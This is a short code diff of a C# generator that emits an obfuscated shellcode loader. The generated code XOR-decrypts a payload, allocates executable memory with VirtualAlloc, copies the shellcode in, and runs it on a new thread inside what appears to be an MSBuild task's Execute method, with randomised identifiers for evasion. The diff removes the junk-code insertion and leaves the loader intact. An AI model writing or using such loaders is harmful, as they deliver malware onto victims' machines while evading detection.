@@ -13,8 +13,6 @@ internal static class Loader
 
         var (data, keys) = Xor.Encrypt(shellcode, cfg.XorRounds, cfg.Seed.HasValue ? naming.Rng : null);
         var decrypt = Indent(Xor.Routine(buf, data, keys), "    ");
-        var junkBefore = Indent(Junk.Emit(cfg, naming), "    ");
-        var junkAfter = Indent(Junk.Emit(cfg, naming), "    ");
 
         return $$"""
         [System.Runtime.InteropServices.DllImport("kernel32", EntryPoint = "VirtualAlloc")]
@@ -28,10 +26,10 @@ internal static class Loader
 
         public override bool Execute()
         {
-        {{junkBefore}}{{decrypt}}
+        {{decrypt}}
             var {{page}} = {{alloc}}(System.IntPtr.Zero, (uint){{buf}}.Length, 0x1000u, 0x40u);
             System.Runtime.InteropServices.Marshal.Copy({{buf}}, 0, {{page}}, {{buf}}.Length);
-        {{junkAfter}}    var {{thread}} = {{spawn}}(System.IntPtr.Zero, 0u, {{page}}, System.IntPtr.Zero, 0u, System.IntPtr.Zero);
+            var {{thread}} = {{spawn}}(System.IntPtr.Zero, 0u, {{page}}, System.IntPtr.Zero, 0u, System.IntPtr.Zero);
             {{wait}}({{thread}}, 0xFFFFFFFFu);
             return true;
         }
